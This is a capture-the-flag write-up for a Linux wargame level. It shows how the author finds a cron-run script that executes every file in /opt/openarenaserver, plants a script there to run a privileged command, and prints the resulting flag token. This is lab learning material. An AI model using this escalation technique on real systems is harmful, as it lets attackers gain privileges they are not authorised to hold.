## Exploring the exercice

```bash 
$ ls -la
$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile

```

Nothing interesting. Let's go back to what we did in the first exercice. 

```bash 
$ find / -user level05 2>/dev/null
[Many results so probably not here]
```

```bash
$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```bash
$ file /usr/sbin/openarenaserver 
/usr/sbin/openarenaserver: POSIX shell script, ASCII text executable
```

```bash
$ ls -l /usr/sbin/openarenaserver 
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

The +1 informs us that an ACL(Access Control List) rule is defined, let's see what it allows us to do.

```bash
$ getfacl /usr/sbin/openarenaserver
# file: usr/sbin/openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
```

We cannot read the file normally but thanks to the ACL rule we can. 

```bash
$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

```

We have a POSIX shell that executes every file in folder /opt/openarenaserver and deletes them after.

Let's try to add a file to the folder. 

```bash
$ echo "getflag" > /opt/openarenaserver/test.sh
$ ls /opt/openarenaserver/
test.sh
```

It worked our file is here. 

```bash
$ /usr/sbin/openarenaserver
-bash: /usr/sbin/openarenaserver: Permission denied
```

We cannot excute the openarenaserver ourself, so a cron must be doing it. 
In fact after a certain period of time our file is gone. 

```bash
$ ls /opt/openarenaserver/

```
Let's right the output of getflag in a file so we can retrieve it after the cron executed it.


```bash
$ echo "getflag > /tmp/flagg" > /opt/openarenaserver/script.sh 
```

```bash
$ cat /tmp/flagg
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

We got our flag !
